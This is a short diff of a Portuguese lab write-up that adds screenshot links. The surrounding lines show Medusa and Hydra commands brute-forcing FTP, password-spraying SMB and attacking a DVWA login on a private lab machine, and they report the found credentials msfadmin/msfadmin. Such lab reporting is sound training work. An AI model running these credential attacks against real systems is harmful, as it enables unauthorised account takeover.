@@ -30,6 +30,8 @@ medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp
 ### Resultado:
 O Medusa identificou credenciais válidas ativas no sistema `msfadmin`/`msfadmin`.
 
+![Ataque FTP](images/ftp_bruteForce.png)
+
 ---
 
 ### 2. Password Spraying em SMB (Porta 445)
@@ -45,6 +47,8 @@ medusa -h 192.168.56.101 -U usuarios.txt -p "msfadmin" -M smbnt
 ### Resultado:
 
 O Medusa confirmou que o usuário `msfadmin` estava ativo no compartilhamento Samba com privilégios de acesso.
+
+![Ataque SMB](images/smb_spraying.png)
 
 ---
 
@@ -65,6 +69,8 @@ hydra -l admin -P senhas.txt 192.168.56.101 http-get-form '/dvwa/vulnerabilities
 ### Resultado:
 
 O Hydra injetou com sucesso o cookie de sessão do navegador do Kali, contornou o redirecionamento e identificou as senhas vulneráveis ativas para o usuário `admin`.
+
+![Ataque Web Hydra](images/web_hydra.png)
 
 ---
 
